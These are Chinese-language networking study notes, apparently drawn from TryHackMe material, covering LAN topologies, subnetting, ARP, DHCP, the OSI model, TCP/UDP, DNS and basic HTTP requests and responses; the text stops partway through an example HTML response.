# 一，准备序列

## 1,网络基础(计网)

### 局域网(LAN),子网,协议等



#### 局域网(LAN)

局域网 (LAN) 拓扑 

星型拓扑

星形拓扑的主要前提是设备通过中央网络设备单独连接，例如 作为交换机或集线器。 这种拓扑结构因其可靠性和可扩展性而成为当今最常见的拓扑结构 - 尽管付出了代价。发送到此拓扑中的设备的任何信息都是通过其连接的中央设备发送的。

由于这种拓扑需要更多的布线和购买专用网络设备，因此更比任何其他拓扑都昂贵。 然而，尽管增加了成本，但这确实提供了一些重要的优点。 例如，这种拓扑本质上更具可扩展性，这意味着很容易添加更多 随着网络需求的增加而增加设备。不幸的是，网络规模越大，保持网络功能所需的维护就越多。 这对维护的依赖增加也会使故障排除变得更加困难。 此外，星形拓扑仍然容易出现故障。 例如，如果连接设备的集中式硬件出现故障， 这些设备将无法再发送或接收数据。



总线拓扑

这种类型的连接依赖于称为主干的单个连接电缆。 这种类型的拓扑类似于树的叶子，因为设备（叶子）源于分支在这条电缆上的位置。

由于发往每个设备的所有数据都通过同一条电缆传输，因此它很快就会变得缓慢且缓慢。 如果拓扑中的设备同时请求数据，则会出现瓶颈。 这个瓶颈也导致了非常 故障排除很困难，因为很快就很难确定哪个设备遇到问题 数据都沿着同一条路线传输。然而，话虽如此，总线拓扑是设置起来更容易且更具成本效益的拓扑之一。最后，总线拓扑的另一个缺点是在发生故障时几乎没有冗余。 这个缺点是因为主干电缆上存在单点故障。 如果这条电缆是 中断后，设备将无法再沿总线接收或传输数据。 



环形拓扑

环形拓扑（也称为令牌拓扑）具有一些相似之处。 计算机等设备已连接直接相互连接以形成环路，这意味着几乎不需要布线。环形拓扑的工作原理是通过环路发送数据，直到数据到达目的地设备，并使用沿途的其他设备循环转发数据。 有趣的是，在此过程中，设备只会发送从另一个设备接收到的数据如果它本身没有任何要发送的拓扑。 如果设备碰巧有数据要发送，它会发送自己的数据在从另一个设备发送数据之前先发送数据。

由于数据在该拓扑中传输只有一个方向，因此对任何问题进行故障排除都相当容易。 出现的故障。 然而，这是一把双刃剑，因为它不是一种有效的数据传输方式 网络，因为它可能必须先访问许多多个设备才能到达预期设备。 最后，环形拓扑不太容易出现瓶颈，例如在总线拓扑中，因为大量流量 任何时候都不通过网络旅行。 然而，这种拓扑的设计确实意味着这样的故障 如电缆被切断或设备损坏将导致整个网络中断。 



**交换机**

交换机是网络中的专用设备，旨在聚合多个其他设备，例如 计算机、打印机或任何其他使用以太网的联网设备。 这些不同的设备插入一个 交换机的端口。交换机和路由器都可以相互连接。 这样做的能力增加了冗余（ 通过添加多条数据传输路径来提高网络的可靠性）。



**路由器**

路由器的工作是连接网络并在网络之间传递数据。 它通过使用路由来做到这一点（因此得名路由器）。路由是给数据跨网络传输过程的标签。 路由涉及在网络之间创建一条路径，以便该数据可以 即可顺利交付。当设备通过许多路径连接时，路由非常有用。 





#### 子网划分

子网划分是通过划分网络中可以容纳的主机数量来实现的，由一个称为子网掩码的数字表示，我们还记得，IP 地址由称为八位字节的四个部分组成。 子网掩码也是如此，它也表示为四个字节（32 位）的数字，范围从 0 到 255 (0-255)。

子网以三种不同的方式使用 IP 地址：

    识别网络地址
    识别主机地址
    识别默认网关

让我们将这三者分开以了解其用途，如下表所示： 

| 类型     | 目的                                                         | 解释                                                         | 例子          |
| -------- | ------------------------------------------------------------ | ------------------------------------------------------------ | ------------- |
| 网络地址 | 该地址标识实际网络的开始并用于标识网络的存在。               | 例如，IP 地址为 192.168.1.100 的设备将位于由 192.168.1.0 标识的网络上 | 192.168.1.0   |
| 主机地址 | 这里的IP地址用于识别子网上的设备                             | 例如，设备的网络地址为 192.168.1.1                           | 192.168.1.100 |
| 默认网关 | 默认网关地址是分配给网络上能够向另一个网络发送信息的设备的特殊地址 | 任何需要发送到不在同一网络上（即不在 192.168.1.0 上）的设备的数据都将发送到该设备。 这些设备可以使用任何主机地址，但通常使用网络中的第一个或最后一个主机地址（.1 或 .254） | 192.168.1.254 |





#### ARP 协议 

设备可以有两个标识符： MAC 地址和 IP 地址， ARP 协议或Address Resolution Protocol(地址解析协议)是一种负责允许设备在网络上识别自身身份的技术。简而言之， ARP 协议允许设备将其 MAC 地址与网络上的 IP 地址关联起来。 网络上的每个设备都会保存与其他设备关联的 MAC 地址的日志。

当设备希望与另一个设备通信时，它们将向整个网络发送广播以搜索特定设备。 设备可以使用 ARP 协议来查找设备的 MAC 地址（以及物理标识符）以进行通信。 

**ARP 是如何工作的？**

网络中的每个设备都有一个用于存储信息的分类帐，称为缓存(cache)。 在ARP协议的上下文中，该缓存存储网络上其他设备的标识符。为了将这两个标识符（IP 地址和 MAC 地址）映射在一起，ARP 协议发送两种类型的消息：

    ARP 请求
    ARP 回复 

发送ARP 请求时该设备会向网络上找到的所有其他设备广播一条消息，询问该设备的MAC地址是否与请求的 IP 地址匹配。 如果设备确实具有所请求的 IP 地址，则会向初始设备返回 ARP 回复以确认这一点。 初始设备现在会记住这一点并将其存储在其缓存中（ ARP 条目）。 





#### DHCP 协议 

IP 地址可以手动分配，通过将其物理输入到设备中，也可以自动分配，最常见的是使用 DHCP（Dynamic Host Configuration Protocol 动态主机配置协议） 。 当设备连接到网络时，如果尚未手动分配 IP 地址，它会发出请求 ( DHCP Discover) 以查看网络上是否有任何 DHCP 服务器。 然后，DHCP 服务器会回复设备可以使用的 IP 地址（DHCP Offer）。 然后，设备发送一个回复，确认它需要所提供的 IP 地址（DHCP Request），最后，DHCP 服务器发送一个回复，确认此操作已完成，并且设备可以开始使用该 IP 地址（DHCP ACK）。 







### OSI模型



#### OSI 模型简介

OSI 模型（Open Systems Interconnection Model 开放系统互联模型）是网络中使用的绝对基本模型。 这个关键模型提供了一个框架，规定所有联网设备如何发送、接收和解释数据。

OSI 模型的主要优点之一是设备在与其他设备通信时可以在网络上具有不同的功能和设计。 通过遵循 OSI 模型统一性的网络发送的数据可以被其他设备理解。

OSI 模型由七层组成，如下图所示。 每层都有一组不同的职责，并按从第 7 层到第 1 层的顺序排列。

在数据传输的每个单独层中，都会发生特定的过程，并且信息片段会添加到该数据中，这就是我们将在本会议室接下来的任务中讨论的内容。 不过，现在我们只需要了解这个过程称为封装，以及 OSI 模型如下图所示： 

![img](https://pic4.zhimg.com/80/v2-794aa7d2b0da939f8559f29ae28136c7_720w.webp)



#### 第 7 层 - 应用层

OSI 模型的应用层是您最熟悉的层。这种熟悉是因为应用层是协议和规则确定用户应如何与发送或接收的数据进行交互的层。OSI 模型的应用程序层本质上为计算机上运行的程序提供网络选项。 它几乎专门与应用程序一起工作，为它们提供一个接口来传输数据。 当数据被提供给应用层时，它被向下传递到表示层。 

电子邮件客户端、浏览器或文件服务器浏览软件（如 FileZilla）等日常应用程序提供Graphical User Interface (GUI) (图形用户界面 )，供用户与发送或接收的数据进行交互。其他协议包括DNS（Domain Name System )，这是将网站地址转换为 IP 地址的方式。



#### 第 6 层 - 表示层

OSI 模型的第 6 层是开始进行标准化的层。因为软件开发人员可以以不同的方式开发任何软件，例如电子邮件客户端，所以数据仍然需要以相同的方式处理——无论软件如何工作。该层充当应用程序层（第 7 层）之间的数据转换器。接收计算机还将理解以一种格式发送到计算机的数据以另一种格式发送。例如，当您发送电子邮件时，其他用户可能有另一个电子邮件客户端给您，但是电子邮件的内容仍然需要显示相同。数据加密（如访问安全站点时的 HTTPS）等安全功能发生在这一层。

表示层从应用层接收数据。 这些数据往往采用应用程序可以理解的格式，但不一定采用接收计算机中的应用程序层可以理解的标准化 格式 。 表示层将数据转换为标准化格式，并处理对数据的任何加密、压缩或其他转换。 完成此操作后，数据将向下传递到会话层。 



#### 第 5 层 - 会话层

一旦从表示层（第 6 层）正确转换或格式化数据，会话层（第 5 层）将开始创建与数据目的地的另一台计算机的连接。建立连接后，将创建一个会话。当此连接处于活动状态时，会话也是如此。会话层（第 5 层）使两台计算机同步，以确保它们在发送和接收数据之前处于同一页面上。一旦这些检查到位，会话层将开始将发送的数据分成更小的数据块，并开始一次一个地发送这些数据块（packets数据包）。这种划分是有益的，因为如果连接丢失，则只有尚未发送的块需要再次发送。值得注意的是，会话是唯一的——这意味着数据不能在不同的会话中传输，但实际上，只能在每个会话中传输。

当会话层从表示层接收到格式正确的数据时，它会查看是否可以通过网络与其他计算机建立连接。 如果不能，那么它会发回一个错误，并且该过程不再继续。如果可以建立会话，那么会话层的工作就是维护它，并与远程计算机的会话层协作以同步通信。 会话层特别重要，因为它创建的会话对于相关通信来说是唯一的。 这允许您同时向不同端点发出多个请求，而不会混淆所有数据（考虑同时在 Web 浏览器中打开两个选项卡）当会话层成功记录主机和远程计算机之间的连接时，数据将向下传递到第 4 层传输层。 



#### 第 4 层 - 传输层

传输层是一个非常有趣的层，具有许多重要的功能。 它的第一个目的是选择传输数据的协议。 传输层最常见的两种协议是 TCP 和 UDP ，对于 TCP 传输是基于连接的 ，这意味着在请求期间建立并维护计算机之间的连接，这允许可靠的传输，因为连接可用于确保数据包全部到达正确的位置。 TCP 连接允许两台计算机保持持续通信，以确保以可接受的速度发送数据，并且重新发送任何丢失的数据。 对于 UDP，情况正好相反，数据包本质上是被扔到接收计算机上——如果它跟不上，那就是它的问题（这就是为什么如果连接不好的话，通过 Skype 等方式进行的视频传输可能会出现像素化的原因）。 这意味着，在精度比速度更重要的情况下（例如文件传输或加载网页），通常会选择 TCP，而在速度更重要的情况下（例如视频流），会使用 UDP。

选择协议后，传输层会将传输分成小块（在 TCP 上这些称为段 segments，在 UDP 上称为数据报 datagrams），这使得成功传输消息变得更容易。 



**OSI 模型的第 4 层**在通过网络传输数据方面起着至关重要的作用，可能有点难以掌握。在设备之间发送数据时，它遵循两种不同协议中的一种，这两种协议是根据几个因素决定的：

    TCP协议
    UDP协议

**TCP**（Transmission Control Protocol 传输控制协议）。该协议在设计时考虑了可靠性和保证。该协议在发送和接收数据所需的时间内保留两个设备之间的恒定连接。不仅如此，TCP还在其设计中加入了错误检查。错误检查是 TCP 如何保证从会话层（第 5 层）中的小块发送的数据已被接收并以相同的顺序重新组合。

TCP的优缺点： 

|              TCP的优点               |                          TCP的缺点                           |
| :----------------------------------: | :----------------------------------------------------------: |
|          保证数据的准确性。          | 需要两个设备之间有可靠的连接。 如果没有接收到一小块数据，则整个数据块都无法使用 |
| 能够同步两个设备以防止彼此被数据淹没 | 缓慢的连接可能会成为另一个设备的瓶颈，因为连接将始终保留在接收计算机上 |
|       为了可靠性执行更多的过程       |   TCP 比 UDP 慢得多，因为使用此协议的设备必须完成更多工作    |

TCP用于文件共享、互联网浏览或发送电子邮件等情况。这种用法是因为这些服务要求数据准确和完整。

**UDP**（User Datagram Protocol）。它没有 TCP 提供的许多功能，例如错误检查和可靠性。任何通过 UDP 发送的数据都会被发送到计算机，无论它是否到达那里。两个设备之间没有同步或保证。

UDP的优缺点： 

|                         UDP的优点                          |                      UDP 的缺点                      |
| :--------------------------------------------------------: | :--------------------------------------------------: |
|                     UDP 比 TCP 快得多                      |               UDP不关心数据是否被接收                |
| UDP 让应用层（用户软件）来决定是否可以控制数据包的发送速度 | 从这个意义上来说，它对于软件开发人员来说是相当灵活的 |
|           UDP 不像 TCP 那样在设备上保留连续连接            |      这意味着不稳定的连接会给用户带来糟糕的体验      |

UDP在发送少量数据的情况下很有用。例如，用于发现设备的协议（ARP和DHCP ）或视频流等较大的文件（如果视频的某些部分像素化也没关系。像素只是丢失的部分数据！）



#### 第 3 层 - 网络层

OSI 模型的第三层 - 网络层是（magic of routing & re-assembly of data takes place）数据路由和重组魔法发生的地方（from these small chunks to the larger chunk 从这些小块到更大的块）。首先，路由(routing)只是确定发送这些数据块的最佳路径。

虽然这一层的一些协议确切地确定了数据到达设备应该采用的“最佳”路径，但我们应该只知道它们存在于网络模块的这个阶段。简而言之，这些协议包括OSPF（Open Shortest Path First 开放最短路径优先协议）和RIP（Routing Information Protocol 路由信息协议）。决定采用何种路线的因素由以下因素决定：什么路径最短？即数据包需要经过的设备数量最少。什么路径最靠谱？我以前在该路径上丢失过数据包吗？哪条路径的物理连接速度更快？即是使用铜连接（较慢）还是光纤（相当快）的路径？ 在这一层，一切都通过 IP 地址处理，例如 192.168.1.100。能够使用 IP 地址传送数据包的设备（例如路由器）被称为第 3 层设备，因为它们能够在 OSI 模型的第三层工作。

网络层负责定位您的请求的目的地。 例如，互联网是一个巨大的网络； 当您想要从网页请求信息时，网络层会获取该页面的 IP 地址并找出最佳路径。 逻辑地址用于为网络提供顺序，对它们进行分类并允许我们对它们进行正确的排序。 目前最常见的逻辑寻址形式是 IPV4 格式，您可能已经熟悉这种格式（即 192.168.1.1 是家庭路由器的常见地址）。 



#### 第 2 层 - 数据链路层

数据链路层侧重于传输的物理寻址。它从网络层接收数据包packet（包括远程计算机的 IP 地址）并添加接收端点的物理MAC （Media Access Control 媒体访问控制） 地址。每台启用网络的计算机内部都有一个Network Interface Card(网络接口卡( NIC ))，它带有一个唯一的MAC地址来识别它。 MAC地址由制造商设置并直接烧入卡中；它们无法更改——尽管它们可以被欺骗。当通过网络发送信息时，实际上是物理地址用于确定将信息发送到哪里。此外，以适合传输的格式呈现数据也是数据链路层的工作。



#### 第 1 层 - 物理层

这一层是最容易掌握的层之一。简而言之，这一层指的是网络中使用的硬件的物理组件，是您能找到的最低层。设备使用电信号在二进制编号系统binary numbering system（1 和 0）中相互传输数据。例如，以太网电缆连接设备





#### 封装

当数据沿着模型的每一层传递时，包含特定于所讨论层的详细信息的更多信息被添加到传输的开始。 例如，网络层添加的标头将包括源和目标 IP 地址等内容，而传输层添加的标头将包括（除其他外）特定于所使用协议的信息。 添加了一个on 数据链路层还在传输的最后 ，用于验证数据在传输时没有被破坏； 这还具有增强安全性的额外好处，因为在不破坏预告片的情况下无法拦截和篡改数据。 这整个过程称为 封装； 将数据从一台计算机发送到另一台计算机的过程。 

<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20231105183717282.png" alt="image-20231105183717282" style="zoom: 33%;" />

<img src="https://img-blog.csdnimg.cn/img_convert/6b405c327a0f785456584e91a400a854.png" alt="image-20220413161600394" style="zoom: 50%;" />

请注意，封装的数据在流程的不同步骤中被赋予不同的名称。 在第7,6和5层中，数据简称为数据 data。 在传输层中，封装的数据称为段 segment或数据报 datagram（取决于选择 TCP 还是 UDP 作为传输协议）。 在网络层，数据被称为数据包 packet。 当数据包向下传递到数据链路层时，它就变成了一个帧 frame，当它通过网络传输时，该帧已分解为多个位 bits。

当第二台计算机收到消息时，它会反转该过程 - 从物理层开始一直工作，直到到达应用层，同时剥离添加的信息。 这称为解封装。 因此，您可以将 OSI 模型的各层视为存在于每台具有网络功能的计算机内。 虽然实际上并不那么明确，但计算机都遵循相同的封装过程来发送数据并在接收数据时解封装。

封装和解封装的过程非常重要——不仅是因为它们的实际用途，而且还因为它们为我们提供了发送数据的标准化方法。 这意味着所有传输将始终遵循相同的方法，允许任何支持网络的设备向任何其他可访问的设备发送请求，并确保该请求能够被理解——无论它们是否来自同一制造商； 使用相同的操作系统； 或任何其他因素。 





### 数据包,TCP/IP,UDP/IP



#### 数据包和帧 

Packets & Frames(数据包和帧)是小块数据，当它们组合在一起时，会形成更大的信息或消息。但是，它们在 OSI 模型中是两个不同的东西。帧位于第 2 层 - 数据链路层，这意味着没有 IP 地址等信息。把这想象成把一个信封放在一个信封里，然后把它寄出去。第一个信封将是您邮寄的数据包，但一旦打开，里面的信封仍然存在并且包含数据（这是一个帧）。这个过程称为封装(encapsulation)，我们在房间 3 中讨论过：OSI 模型。在这个阶段，可以安全地假设当我们谈论任何 IP 地址时，我们都是在谈论数据包packets。当封装信息被剥离时，我们谈论的是帧frame本身。数据包是跨联网设备传输数据的有效方式，如任务 1 中所述。由于此数据以小块形式交换，因此与一次发送大消息相比，跨网络出现瓶颈的可能性更小。

数据包具有不同的结构，具体取决于正在发送的数据包的类型。 正如我们将要讨论的，网络充满了标准和协议，它们充当设备上如何处理数据包的一组规则。使用此协议的数据包将具有一组标头，其中包含通过网络发送的数据的附加信息。

一些值得注意的标头包括： 

|              标头              |                             描述                             |
| :----------------------------: | :----------------------------------------------------------: |
|     生存时间 Time to Live      | 该字段为数据包设置了一个到期计时器，如果它从未设法到达主机或逃逸，则不会阻塞您的网络 |
|        校验和 Checksum         | 该字段为 TCP/IP 等协议提供完整性检查。 如果任何数据发生更改，该值将与预期不同，从而损坏 |
|     源地址 Source Address      |     数据包的设备的 IP 地址， 以便数据知道发送返回到哪里      |
| 目的地地址 Destination Address | 数据包发送到的设备的 IP 地址，以便数据知道下一步要传输到哪里 |





#### TCP/IP（三次握手） 

TCP（Transmission Control Protocol for short 简称为传输控制协议）是网络中使用的另一种规则。该协议与我们之前在本模块第三房间讨论过的 OSI 模型非常相似。TCP/IP 协议由四层组成，可以说只是 OSI 模型的一个概括版本。

    应用层
    运输层
    互联网层
    网络接口层 

<img src="https://img-blog.csdn.net/20180930155137505?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NzZG5fa291/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img" style="zoom: 50%;" />

<img src="https://img-blog.csdnimg.cn/20201028134158932.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d3eTAzMjQ=,size_16,color_FFFFFF,t_70#pic_center" alt="img" style="zoom:67%;" />

与 OSI 模型的工作方式非常相似，当数据（或数据包）穿过它时，信息被添加到TCP模型的每一层。您可能还记得，这个过程被称为封装——这个过程的逆过程是解封装。



TCP 数据包包含从封装中添加的各种信息部分（称为标头）。 让我们解释一下下表中的一些关键标头： 

| 标头                            | 描述                                                         |
| ------------------------------- | ------------------------------------------------------------ |
| 源端口  Source Port             | 该值是发送方打开的用于发送 TCP 数据包的端口。 该值是随机选择的（从当时尚未使用的 0-65535 端口中选择） |
| 目的端口 Destination Port       | 该值是远程主机（接收数据的主机）上运行的应用程序或服务的端口号； 例如，在端口 80 上运行的 Web 服务器。与源端口不同，该值不是随机选择的 |
| 源IP Source IP                  | 这是发送数据包的设备的 IP 地址                               |
| 目的IP Destination IP           | 这是数据包目的地设备的 IP 地址                               |
| 序列号 Sequence Number          | 当连接发生时，传输的第一条数据会被赋予一个随机数             |
| 确认编号 Acknowledgement Number | 当一条数据被赋予序列号后，下一条数据的编号将具有序列号+1     |
| 校验和 Checksum                 | 该值赋予 TCP 完整性。 在记住输出的情况下进行数学计算。 当接收设备执行数学计算时，如果输出与发送的内容不同，则数据必定已损坏 |
| 数据 Data                       | 该标头是存储数据（即正在传输的文件的字节）的位置             |
| 旗帜 Flag                       | 该标头确定握手过程中任一设备应如何处理数据包。 特定的标志将决定特定的行为 |



**TCP 三次握手建立连接**

TCP的一个定义特征是它是基于连接的，这意味着TCP必须在发送数据之前在客户端和充当服务器的设备之间建立连接 。因此，TCP保证发送的任何数据都会在另一端收到，这个过程被命名为三次握手。

| Step | 信息              | 描述                                                         |
| ---- | ----------------- | ------------------------------------------------------------ |
| 1    | 同步 SYN          | SYN 消息是客户端在握手期间发送的初始数据包。 该数据包用于启动连接并将两个设备同步在一起 |
| 2    | 查看/确认 SYN/ACK | 该数据包由接收设备（服务器）发送，以确认客户端的同步尝试     |
| 3    | 确认 ACK          | 客户端或服务器可以使用确认数据包来确认已成功接收到一系列消息/数据包 |
| 4    | 数据 DATA         | 一旦建立连接，数据（例如文件的字节）将通过“DATA”消息发送     |
| 5    | FIN               | 该数据包用于在连接完成后关闭连接。                           |
| #    | RST               | 该数据包突然结束所有通信。 这是最后的手段，表明在此过程中出现了一些问题。 例如，如果服务或应用程序无法正常工作，或者系统出现资源不足等故障 |



三次握手过程的示意图如下：

![img](https://pic1.zhimg.com/v2-8ce8c897b4d5e7397b25eb4d4b31d7fc_r.jpg)

**TCP 四次挥手关闭连接**

四次挥手即终止TCP连接，就是指断开一个TCP连接时，需要客户端和服务端总共发送4个包以确认连接的断开。

四次挥手过程的示意图如下：

![img](https://pic4.zhimg.com/v2-1b3935fa6bcccddd2d9d1b04d92ef563_r.jpg)





#### UDP/IP

The User Datagram Protocol (用户数据报协议 ( UDP ))是另一种用于在设备之间传送数据的协议。与TCP 不同，UDP 是一种无状态(stateless)协议，不需要两个设备之间的持续连接来发送数据。例如，不会发生三次握手，两个设备之间也没有任何同步。

UDP 数据包比 TCP 数据包简单得多，并且标头也更少。 但是，这两种协议共享一些标准标头，如下表所示： 

| 标头           | 描述                                                         |
| -------------- | ------------------------------------------------------------ |
| 生存时间 (TTL) | 该字段为数据包设置一个到期计时器，因此如果它从未设法到达主机或逃脱，它不会阻塞您的网络 |
| 源地址         | 发送数据包的设备的 IP 地址，以便数据知道返回到哪里           |
| 目的地地址     | 数据包发送到的设备的 IP 地址，以便数据知道下一步要传输到哪里 |
| 源端口         | 该值是发送方打开的用于发送 UDP 数据包的端口。 该值是随机选择的（从当时尚未使用的 0-65535 端口中选择） |
| 目的端口       | 该值是远程主机（接收数据的主机）上运行的应用程序或服务的端口号； 例如，在端口 80 上运行的 Web 服务器。与源端口不同，该值不是随机选择的 |
| 数据           | 该标头是存储数据（即正在传输的文件的字节）的位置             |

接下来，我们将讨论通过 UDP 进行连接的过程与 TCP 等连接过程有何不同。 我们应该记住 UDP 是 无状态的 。 连接期间不发送确认信息。







### DNS

DNS（Domain Name System 域名系统）为我们提供了一种与互联网上的设备进行通信的简单方法，而无需记住复杂的数字。互联网上的每台计算机都有自己唯一的地址来与其通信，称为 IP 地址。 IP 地址如下所示 104.26.10.229 ，由句点分隔的 4 组数字，范围从 0 - 255。 当您想要访问某个网站时，记住这组复杂的数字并不方便，而这正是 DNS 可以提供帮助的地方。

有没有想过 URL 如何转换为您的计算机可以理解的 IP 地址？ 答案是称为 DNS 的 TCP/IP 协议。在最基本的层面上，DNS 允许我们请求特殊的服务器为我们提供我们尝试访问的网站的 IP 地址。 例如，如果我们向 www.google.com 发出请求，我们的计算机将首先向特殊的 DNS 服务器发送请求（您的计算机已经知道如何找到该服务器）。 然后服务器会寻找 Google 的 IP 地址并将其发送回给我们。 然后我们的计算机可以将请求发送到 Google 服务器的 IP。 



#### 域层次结构 

**TLD (Top-Level Domain 顶级域名)**

TLD 是域名最右边的部分。例如，tryhackme.com TLD 是.com。TLD 有两种类型，gTLD（Generic Top Level 通用顶级域名）和 ccTLD（Country Code Top Level Domain 国家代码顶级域名）。从历史上看，gTLD 旨在告诉用户域名的用途。例如，.com 用于商业目的，.org 用于组织，.edu 用于教育，.gov 用于政府。ccTLD 用于地理用途，例如，.ca 用于加拿大的网站，.co.uk 用于英国的网站等。由于这种需求，新 gTLD 大量涌入，包括 .online、.club、.website、.biz 等等。 如需 2000 多个 TLD 的完整列表：https://data.iana.org/TLD/tlds-alpha-by-domain.txt 。



**Second-Level Domain(二级域名)**

以tryhackme.com为例，.com部分为TLD，tryhackme为二级域名。注册域名时，二级域名限制为63个字符+TLD，只能使用az 0-9和连字符（不能以连字符开头或结尾，也不能有连续的连字符）。



**Subdomain(子域名)**

子域位于二级域的左侧，使用句点分隔；例如，在名称 admin.tryhackme.com 中，管理部分是子域。子域名的创建限制与二级域名相同，限制为 63 个字符，并且只能使用 az 0-9 和连字符（不能以连字符_开头或结尾，也不能有连续的连字符）。您可以使用多个以句点分隔的子域来创建更长的名称，例如 jupiter.servers.tryhackme.com。但长度必须保持在 253 个字符以内。您可以为您的域名创建的子域数量没有限制。





#### 记录类型 

Record Types(记录类型)

DNS 记录类型

DNS 不仅适用于网站，还存在多种类型的 DNS 记录。我们将介绍您可能会遇到的一些最常见的问题。

**A Record**

这些记录解析为 IPv4 地址，例如104.26.10.229

**AAAA Record**

这些记录解析为 IPv6 地址，例如2606:4700:20::681a:be5

**CNAME记录**

这些记录解析到另一个域名，例如，TryHackMe 的在线商店有子域名 store.tryhackme.com，它返回一个 CNAME 记录 shopify.com。然后将向 shops.shopify.com 发出另一个 DNS 请求以计算出 IP 地址。

**MX记录**

这些记录解析为处理您正在查询的域的电子邮件的服务器地址，例如，tryhackme.com 的 MX 记录响应看起来类似于alt1.aspmx.l.google.com 。这些记录还带有优先级标志。这告诉客户端尝试服务器的顺序，这非常适合主服务器出现故障并且需要将电子邮件发送到备份服务器的情况。

**TXT记录**

TXT 记录是自由文本字段，可以在其中存储任何基于文本的数据。TXT 记录有多种用途，但一些常见的用途是列出有权代表域发送电子邮件的服务器（这有助于打击垃圾邮件和欺骗性电子邮件）。它们还可用于在注册第三方服务时验证域名的所有权。





#### 发出DNS 请求

1.当您请求域名时，您的计算机首先会检查其本地缓存，看看您最近是否曾经查找过该地址；如果没有，将向您的递归 DNS 服务器(Recursive DNS Server)发出请求。

2.递归 DNS 服务器(Recursive DNS )通常由您的 ISP 提供，但您也可以选择自己的。该服务器还有一个最近查找的域名的本地缓存。如果在本地找到结果，则会将其发送回您的计算机，并且您的请求到此结束（这对于流行且请求频繁的服务很常见，例如 Google、Facebook、Twitter）。如果无法在本地找到请求，则开始寻找正确答案的旅程，从互联网的根 DNS 服务器开始。

3.根服务器(root DNS servers)充当互联网的 DNS 主干；他们的工作是根据您的要求将您重定向到正确的顶级域服务器。例如，如果您请求www.tryhackme.com，根服务器将识别 .com 的顶级域，并将您引向处理 .com 地址的正确 TLD 服务器。

4.TLD 服务器保存在哪里可以找到权威服务器(authoritative server)来回答 DNS 请求的记录。权威服务器通常也称为域的名称服务器。例如，tryhackme.com的名称服务器是kip.ns.cloudflare.com和uma.ns.cloudflare.com。您经常会发现一个域名的多个名称服务器可以充当备份，以防其中一个出现故障。

5.权威 DNS 服务器(An authoritative DNS server)是负责存储特定域名的 DNS 记录以及对您的域名 DNS 记录进行任何更新的服务器。根据记录类型，DNS 记录然后被发送回递归 DNS 服务器，本地副本将被缓存以供将来请求使用，然后转发回发出请求的原始客户端。DNS 记录都带有 TTL（Time To Live 生存时间）值。此值是一个以秒为单位的数字，在您必须再次查找之前，应将响应保存在本地。每次与服务器通信时，缓存都无需发出 DNS 请求。

<img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/f93ecbb21877cd18fda5b54070087c2b.svg" alt="https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/f93ecbb21877cd18fda5b54070087c2b.svg" style="zoom: 50%;" />









### HTTP

**HTTP**（HyperText Transfer Protocol 超文本传输协议）

HTTP是您浏览网站时使用的，由 Tim Berners-Lee 和他的团队在 1989-1991 年间开发。HTTP 是用于与网络服务器通信以传输网页数据的一组规则，无论是 HTML、图像、视频等。

**HTTPS**（HyperText Transfer Protocol Secure 超文本传输协议安全）

HTTPS 是 HTTP 的安全版本。HTTPS 数据经过加密，因此它不仅可以阻止人们看到您正在接收和发送的数据，而且还可以确保您正在与正确的 Web 服务器通信，而不是冒充它的东西。





#### URL

当我们访问网站时，您的浏览器需要向 Web 服务器发出请求，以获取 HTML、图像等资源，并下载响应。 在此之前，您需要具体告诉浏览器如何以及在哪里访问这些资源，这就是 URL 的用武之地。



**URL**（Uniform Resource Locator 统一资源定位器）

如果您使用过互联网，那么您之前就使用过 URL。URL 主要是关于如何访问 Internet 上的资源的说明。下图显示了一个 URL 的外观及其所有功能（它不会在每个请求中使用所有功能）。

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/34ad66d8b90aaaa35f9536d3b152ea97.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/34ad66d8b90aaaa35f9536d3b152ea97.png)

**方案Scheme**：http，这指示使用什么协议来访问资源，例如HTTP、HTTPS、FTP（文件传输协议）。

**用户User**：user.password，有些服务需要身份验证才能登录，您可以在URL中输入用户名和密码进行登录。

**主机Host/Domain**：tryhackme.com，您要访问的服务器的域名或IP地址。

**端口Port**：80，您要连接到的端口，对于HTTP通常为 80 ，对于 HTTPS 通常为 443，但这可以托管在 1 - 65535 之间的任何端口上。

**路径Path**：view-room，您尝试访问的资源的文件名或位置。

**查询字符串Query String**：?id=1，可以发送到请求路径的额外信息位。例如，/博客？id=1将告诉博客路径您希望接收 id 为 1 的博客文章。

**片段Fragment**：#task3，这是对请求的实际页面上某个位置的引用。这通常用于内容较长的页面，并且可以将页面的某个部分直接链接到它，因此用户一访问页面就可以看到它。





#### 请求和响应 

**发出请求**

只需一行“ GET / HTTP/1.1 ”即可向 Web 服务器发出请求 

<img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/09e70200e7af451077081a3ee3d3708c.png" alt="https://tryhackme-images.s3.amazonaws.com/user-uploads/5c549500924ec576f953d9fc/room-content/09e70200e7af451077081a3ee3d3708c.png" style="zoom:33%;" />



但为了获得更丰富的网络体验，您还需要发送其他数据。 其他数据在所谓的标头中发送，其中标头包含提供给您正在通信的 Web 服务器的额外信息，但我们将在标头任务中详细介绍这一点。

**请求示例：**

GET / HTTP/1.1
Host: tryhackme.com
User-Agent: Mozilla/5.0 Firefox/87.0
Referer: https://tryhackme.com/

*要细分此请求的每一行：* 

第 1 行：此请求发送 GET 方法（在HTTP方法任务中对此有更多介绍），使用 / 请求主页并告诉 Web 服务器我们正在使用 HTTP 协议版本 1.1。

第 2 行：我们告诉 Web 服务器我们想要网站 tryhackme.com

第 3 行：我们告诉 Web 服务器我们正在使用 Firefox 87 版浏览器

第 4 行：我们告诉网络服务器将我们引向这个网页的网页是https://tryhackme.com

第 5 行：HTTP请求总是以空行结束，以通知 Web 服务器请求已完成。



**响应示例：**


HTTP/1.1 200 OK
Server: nginx/1.15.8
Date: Fri, 09 Apr 2021 13:34:03 GMT
Content-Type: text/html
Content-Length: 98

<html>

<head>
    <title>TryHackMe</title>
</head>
<body>
